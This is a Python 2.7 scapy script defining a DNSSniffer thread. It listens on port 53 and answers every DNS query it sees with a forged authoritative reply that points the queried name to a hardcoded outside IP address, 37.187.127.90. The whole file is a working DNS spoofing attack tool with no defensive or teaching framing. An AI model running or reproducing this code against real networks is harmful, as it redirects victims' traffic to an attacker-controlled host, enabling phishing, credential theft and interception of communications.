#!/usr/bin/python2.7 
 
import threading, time 
from scapy.all import * 
 
class DNSSniffer(threading.Thread): 
  def __init__(self, rIp, interface): 
    threading.Thread.__init__(self) 
    self.e = threading.Event() 
    self.rIp = rIp 
    self.interface = interface 
    self.kill_received = False 
  
  def run(self): 
    while not self.kill_received: 
      DNSSniffer.sniff(self)     
 
  def stop(self): 
    self.e.set() 
    print " -- Stopping DNSSniff" 
   
  def cb(self, pkt):
    redirect_to = '37.187.127.90'
    if pkt.haslayer(DNSQR):
      print pkt[IP].src , "->" , pkt[IP].dst , "(" + pkt.getlayer(DNS).qd.qname, ")"
      spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
          UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
          DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa = 1, qr=1, \
          an=DNSRR(rrname=pkt[DNS].qd.qname,  ttl=10, rdata=redirect_to))
      send(spoofed_pkt,verbose=0)
      print 'Sent spoofed packet'

  def sniff(self):
    sniff(iface = self.interface, filter = 'port 53', prn = self.cb, stop_filter=lambda p: self.e.is_set()) 
